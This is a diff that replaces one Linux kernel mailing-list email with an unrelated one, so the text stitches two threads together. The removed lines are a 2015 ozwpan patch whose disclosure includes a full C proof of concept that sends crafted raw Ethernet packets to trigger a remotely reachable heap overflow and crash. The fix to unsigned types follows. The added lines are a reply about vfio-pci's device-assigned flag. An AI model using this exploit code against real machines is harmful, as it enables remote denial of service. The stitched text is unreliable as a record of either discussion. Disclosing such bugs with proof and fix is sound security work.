@@ -1,241 +1,87 @@
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Subject: [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow
-Date: Wed, 13 May 2015 20:33:32 +0200
-Message-ID: <1431542014-3239-3-git-send-email-Jason@zx2c4.com>
-References: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
-To: shigekatsu.tateno@atmel.com, linux-kernel@vger.kernel.org,
-	netdev@vger.kernel.org, oss-security@lists.openwall.com
+From: Alex Williamson <alex.williamson@redhat.com>
+Subject: Re: [PATCH] vfio-pci: PCI_DEV_FLAGS_ASSIGNED flag not set when PCI
+ device is assigned
+Date: Wed, 13 May 2015 12:39:17 -0600
+Message-ID: <1431542357.3625.62.camel@redhat.com>
+References: <20150513013550.10328.1416.stgit@bwallan-smackover2.jf.intel.com>
+	 <1431484908.3625.10.camel@redhat.com>
+	 <804857E1F29AAC47BF68C404FC60A1846BBD2E63@ORSMSX105.amr.corp.intel.com>
+Mime-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+Cc: "kvm@vger.kernel.org" <kvm@vger.kernel.org>,
+	"netdev@vger.kernel.org" <netdev@vger.kernel.org>,
+	"intel-wired-lan@lists.osuosl.org" <intel-wired-lan@lists.osuosl.org>
+To: "Allan, Bruce W" <bruce.w.allan@intel.com>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from frisell.zx2c4.com ([192.95.5.64]:55022 "EHLO frisell.zx2c4.com"
+Received: from mx1.redhat.com ([209.132.183.28]:38506 "EHLO mx1.redhat.com"
 	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1754952AbbEMSea (ORCPT <rfc822;netdev@vger.kernel.org>);
-	Wed, 13 May 2015 14:34:30 -0400
-In-Reply-To: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
+	id S965001AbbEMSjV (ORCPT <rfc822;netdev@vger.kernel.org>);
+	Wed, 13 May 2015 14:39:21 -0400
+In-Reply-To: <804857E1F29AAC47BF68C404FC60A1846BBD2E63@ORSMSX105.amr.corp.intel.com>
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-Using signed integers, the subtraction between required_size and offset
-could wind up being negative, resulting in a memcpy into a heap buffer
-with a negative length, resulting in huge amounts of network-supplied
-data being copied into the heap, which could potentially lead to remote
-code execution.. This is remotely triggerable with a magic packet.
-A PoC which obtains DoS follows below. It requires the ozprotocol.h file
-from this module.
+On Wed, 2015-05-13 at 17:50 +0000, Allan, Bruce W wrote:
+> > -----Original Message-----
+> > From: Alex Williamson [mailto:alex.williamson@redhat.com]
+> > Sent: Tuesday, May 12, 2015 7:42 PM
+> > To: Allan, Bruce W
+> > Cc: kvm@vger.kernel.org; netdev@vger.kernel.org; intel-wired-
+> > lan@lists.osuosl.org
+> > Subject: Re: [PATCH] vfio-pci: PCI_DEV_FLAGS_ASSIGNED flag not set when
+> > PCI device is assigned
+> > 
+> > On Tue, 2015-05-12 at 18:35 -0700, Bruce Allan wrote:
+> > > A number of PCI device drivers supporting SR-IOV use pci_vfs_assigned()
+> > to
+> > > check if there are any VF devices assigned by a VMM prior to disabling
+> > > SR-IOV (i.e. bnx2x, be2net, fm10k, i40e, igb, ixgbe, qlcnic).  This check
+> > > works fine with the legacy device assignment (pci-stub enables the
+> > device)
+> > > which calls pci_set_dev_assigned().  The newer VFIO-based assignment
+> > > (vfio-pci enables device) doesn't call pci_set_dev_assigned() potentially
+> > > leading to issues in those drivers when disabling SR-IOV with VFs assigned.
+> > >
+> > > Add calls to pci_[set|clear]_dev_assigned() to set the flag as expected.
+> > >
+> > > Signed-off-by: Bruce Allan <bruce.w.allan@intel.com>
+> > > ---
+> > >  drivers/vfio/pci/vfio_pci.c |    4 ++++
+> > >  1 file changed, 4 insertions(+)
+> > 
+> > 
+> > Why should a device exposed to the user be handled differently than a
+> > device used by a host driver?  The reason the assigned flag exists is
+> > because legacy KVM device assignment doesn't actually claim the device
+> > using the driver model, it relies on pci-stub to act as a placeholder to
+> > prevent other drivers from binding to the device, but pci-stub has no
+> > visibility to the device usage and will immediately release it
+> > regardless of it being in use.  vfio-pci participates in the driver
+> > model, signals the user for the device to be released and blocks until
+> > it is released.  Beyond that, the assigned flag is a racy hack.  There's
+> > no locking whatsoever to imply that the flag as any meaning beyond the
+> > instant that it's tested.  I'd like to see the assigned flag deprecated
+> > along with legacy KVM device assignment, not perpetuated in newer
+> > drivers.  The patch is also wrong because we can tell when the device is
+> > actually opened by the user, not just bound to the vfio-pci driver.
+> > Thanks,
+> > 
+> > Alex
+> 
+> So for clarification, in the drivers mentioned above would you recommend
+> rather than checking pci_vfs_assigned() before disabling SR-IOV the drivers
+> should instead check if any of the VF devices are bound/opened by another
+> driver?
 
-=-=-=-=-=-=
+That would also be racy, it could be unbound at your test point and
+bound immediately after.  Driver binding also doesn't necessarily imply
+that the device is in use; vfio-pci will immediately release an unused
+device.  Again, why are we trying to handle this as a special case?
+vfio-pci is just another driver.  If it can release the device, it will.
+It will even try to signal the user to release it.  Beyond that, we're
+bound by the driver model.  If we want drivers to be able to return
+-EBUSY if the device is in use, fix the driver model, don't hack around
+it with racy tests like the assigned flag.  Thanks,
 
- #include <arpa/inet.h>
- #include <linux/if_packet.h>
- #include <net/if.h>
- #include <netinet/ether.h>
- #include <stdio.h>
- #include <string.h>
- #include <stdlib.h>
- #include <endian.h>
- #include <sys/ioctl.h>
- #include <sys/socket.h>
-
- #define u8 uint8_t
- #define u16 uint16_t
- #define u32 uint32_t
- #define __packed __attribute__((__packed__))
- #include "ozprotocol.h"
-
-static int hex2num(char c)
-{
-	if (c >= '0' && c <= '9')
-		return c - '0';
-	if (c >= 'a' && c <= 'f')
-		return c - 'a' + 10;
-	if (c >= 'A' && c <= 'F')
-		return c - 'A' + 10;
-	return -1;
-}
-static int hwaddr_aton(const char *txt, uint8_t *addr)
-{
-	int i;
-	for (i = 0; i < 6; i++) {
-		int a, b;
-		a = hex2num(*txt++);
-		if (a < 0)
-			return -1;
-		b = hex2num(*txt++);
-		if (b < 0)
-			return -1;
-		*addr++ = (a << 4) | b;
-		if (i < 5 && *txt++ != ':')
-			return -1;
-	}
-	return 0;
-}
-
-int main(int argc, char *argv[])
-{
-	if (argc < 3) {
-		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
-		return 1;
-	}
-
-	uint8_t dest_mac[6];
-	if (hwaddr_aton(argv[2], dest_mac)) {
-		fprintf(stderr, "Invalid mac address.\n");
-		return 1;
-	}
-
-	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
-	if (sockfd < 0) {
-		perror("socket");
-		return 1;
-	}
-
-	struct ifreq if_idx;
-	int interface_index;
-	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		return 1;
-	}
-	interface_index = if_idx.ifr_ifindex;
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
-		perror("SIOCGIFHWADDR");
-		return 1;
-	}
-	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
-
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_elt_connect_req oz_elt_connect_req;
-	} __packed connect_packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(0)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_CONNECT_REQ,
-			.length = sizeof(struct oz_elt_connect_req)
-		},
-		.oz_elt_connect_req = {
-			.mode = 0,
-			.resv1 = {0},
-			.pd_info = 0,
-			.session_id = 0,
-			.presleep = 35,
-			.ms_isoc_latency = 0,
-			.host_vendor = 0,
-			.keep_alive = 0,
-			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
-			.max_len_div16 = 0,
-			.ms_per_isoc = 0,
-			.up_audio_buf = 0,
-			.ms_per_elt = 0
-		}
-	};
-
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_get_desc_rsp oz_get_desc_rsp;
-	} __packed pwn_packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(1)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_APP_DATA,
-			.length = sizeof(struct oz_get_desc_rsp)
-		},
-		.oz_get_desc_rsp = {
-			.app_id = OZ_APPID_USB,
-			.elt_seq_num = 0,
-			.type = OZ_GET_DESC_RSP,
-			.req_id = 0,
-			.offset = htole16(2),
-			.total_size = htole16(1),
-			.rcode = 0,
-			.data = {0}
-		}
-	};
-
-	struct sockaddr_ll socket_address = {
-		.sll_ifindex = interface_index,
-		.sll_halen = ETH_ALEN,
-		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-	};
-
-	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	usleep(300000);
-	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	return 0;
-}
-
-Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
----
- drivers/staging/ozwpan/ozhcd.c   | 8 ++++----
- drivers/staging/ozwpan/ozusbif.h | 4 ++--
- 2 files changed, 6 insertions(+), 6 deletions(-)
-
-diff --git a/drivers/staging/ozwpan/ozhcd.c b/drivers/staging/ozwpan/ozhcd.c
-index 5ff4716..784b5ec 100644
---- a/drivers/staging/ozwpan/ozhcd.c
-+++ b/drivers/staging/ozwpan/ozhcd.c
-@@ -746,8 +746,8 @@ void oz_hcd_pd_reset(void *hpd, void *hport)
- /*
-  * Context: softirq
-  */
--void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
--			int length, int offset, int total_size)
-+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,
-+			u8 length, u16 offset, u16 total_size)
- {
- 	struct oz_port *port = hport;
- 	struct urb *urb;
-@@ -759,8 +759,8 @@ void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
- 	if (!urb)
- 		return;
- 	if (status == 0) {
--		int copy_len;
--		int required_size = urb->transfer_buffer_length;
-+		unsigned int copy_len;
-+		unsigned int required_size = urb->transfer_buffer_length;
- 
- 		if (required_size > total_size)
- 			required_size = total_size;
-diff --git a/drivers/staging/ozwpan/ozusbif.h b/drivers/staging/ozwpan/ozusbif.h
-index 4249fa3..d2a6085 100644
---- a/drivers/staging/ozwpan/ozusbif.h
-+++ b/drivers/staging/ozwpan/ozusbif.h
-@@ -29,8 +29,8 @@ void oz_usb_request_heartbeat(void *hpd);
- 
- /* Confirmation functions.
-  */
--void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status,
--	const u8 *desc, int length, int offset, int total_size);
-+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status,
-+	const u8 *desc, u8 length, u16 offset, u16 total_size);
- void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,
- 	const u8 *data, int data_len);
- 
--- 
-2.3.6
+Alex
